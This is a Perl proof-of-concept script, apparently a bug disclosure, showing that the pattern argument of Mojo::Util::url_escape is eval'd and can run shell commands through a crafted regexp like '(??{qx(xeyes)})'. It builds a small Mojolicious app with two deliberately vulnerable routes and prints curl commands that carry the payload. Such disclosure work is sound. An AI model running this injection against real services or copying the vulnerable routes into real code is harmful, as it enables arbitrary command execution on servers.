#!/usr/bin/env perl
#
# Mojo::Util::url_escape's "pattern"-argument can execute code
# ============================================================
#
# The 2nd argument to Mojo::Util::url_escape() can execute code. This script
# contains examples on how this bug can lead to a vulnerability.
#
# NOTE: I've been unable to exploit this in Mojolicious without introducing
# deliberate (and perhaps subtle) bugs in usage.
#
# Essentially, this is the problem:
#
#   url_escape 'foo', '\w](??{qx(xeyes)})|[a';
#
# Usage examples from the Mojo::Util perldoc:
#
#   url_escape $str;
#   url_escape $str, '^A-Za-z0-9\-._~';
#
# Where the first argument is the value to escape, and the optional second
# argument is a partial regexp describing a pattern to escape or not.
#
#
# Thoughts
# --------
#
# 1. Arbitrary code can be sent as a string to to the second argument of the
# frequently used url_escape function due to library eval'ing generated code.
# And can be exploited if the second argument can be controlled somehow by user
# input, perhaps by a function returning a list rather than a single scalar.
#
# 2. The (??{ code ...}) feature requires `use re 'eval'` to allow it to be
# interpolated into a regular expression for security reasons. The use of eval
# in url_escape disables this protection.
#
# I.e. this will fail with "Eval-group not allowed at runtime, use re 'eval'"
#
#    my $var = "foo";
#    my $regexp = '(??{qx(xeyes)})';
#    $var =~ s/$regexp/blah/;
#
# But this will to trough and 👀
#
#    my $regexp = '(??{qx(xeyes)})';
#    my $code = "my \$var='foo'; \$var=~s/$regexp/blah/;";
#    eval $code;
#
# 3. It would imho be unexpected behaviour for this function to be able to to
# execute arbitrary code, even though it would require another bug to be
# exploited.
#
#
# 2019-04-07 - stig@stig.io

use strict;
use Mojolicious::Lite;
use Mojo::Util qw(url_escape);
use CGI;

sub warn_curl_example { warn "** $_[0]: curl 'http://localhost:3000/$_[0]?$_[1]'\n"; }

# A "bad" second argument to url_escape ends up executing code using ??{}, if
# called like this: url_escape("foo", $bad_regexp);
#
my $bad_regexp = '\w](??{qx(xeyes)})|[a';

die "xeyes not found in path\n" unless qx(which xeyes);

# VULNERABLE CODE EXAMPLE 1: Accepting regexp for use in url_escape() from user
# input.
#
warn_curl_example 'escape', 'value=x&regexp=' . url_escape($bad_regexp);

get '/escape' => sub {
    my $c = shift;

    my $escaped = url_escape($c->param('value'), $c->param('regexp'));

    return $c->render( text => "Escaped: $escaped" );
};


# VULNERABLE CODE EXAMPLE 2: Using CGI::param, insecurely, in list context with
# url_escape (weird, but might happen).
#
warn_curl_example 'cgi-pm', 'value=1&value=' . url_escape($bad_regexp);

get '/cgi-pm' => sub {
    my $c = shift;
    my $CGI = CGI->new($c->req->query_params); # Let's pretend we're using CGI.pm

    # warns that "CGI::param called in list context", good! :D
    my $escaped = url_escape($CGI->param("value"));

    return $c->render( text => "Escaped: $escaped" );
};



app->start;
